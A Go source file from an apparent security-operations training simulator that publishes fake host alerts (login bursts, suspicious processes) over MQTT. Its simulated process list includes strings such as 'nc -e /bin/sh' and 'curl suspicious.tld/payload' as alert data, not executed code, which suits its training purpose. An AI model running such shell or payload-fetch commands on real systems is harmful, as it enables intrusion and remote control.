package publishers

import (
	"context"
	"fmt"
	"log"

	"soc-mqtt-simulator/backend/models"
	socmqtt "soc-mqtt-simulator/backend/mqtt"
)

func StartHost(ctx context.Context, brokerURL string, sim *Simulator) error {
	agent := Agent{
		Name:        "host",
		ClientID:    "publisher-host-agent",
		StatusTopic: socmqtt.TopicHostStatus,
		BrokerURL:   brokerURL,
	}
	client, err := agent.connect()
	if err != nil {
		return err
	}
	go client.Wait(ctx)

	go func() {
		log.Printf("[publisher:host] started")
		hosts := []string{"server-01", "server-02", "workstation-01"}
		processes := []string{"nc -e /bin/sh", "curl suspicious.tld/payload", "powershell encoded command", "miner-daemon"}
		profile := sim.Profile()
		for sim.Delay(ctx, 2, 4) {
			host := hosts[randIntn(len(hosts))]
			if sim.Chance(profile.AuthBurstChance) {
				publishEvent(client, fmt.Sprintf(socmqtt.TopicHostAuthPattern, host), socmqtt.QoSAtLeastOnce, false, EventPayload{
					Type:        models.BruteForce,
					Severity:    models.Medium,
					SourceIP:    randomIP(),
					DestIP:      randomPrivateIP(),
					Port:        22,
					Description: "Failed login burst detected on host",
					Agent:       "host",
					Hostname:    host,
				})
				continue
			}

			severity := models.High
			if !sim.Chance(profile.MalwareChance) {
				severity = models.Medium
			}
			publishEvent(client, fmt.Sprintf(socmqtt.TopicHostProcessPattern, host), socmqtt.QoSAtMostOnce, false, EventPayload{
				Type:        models.Malware,
				Severity:    severity,
				SourceIP:    randomPrivateIP(),
				DestIP:      randomIP(),
				Port:        randomPort(),
				Description: "Suspicious process execution detected",
				Agent:       "host",
				Hostname:    host,
				Process:     processes[randIntn(len(processes))],
			})
		}
	}()

	return nil
}
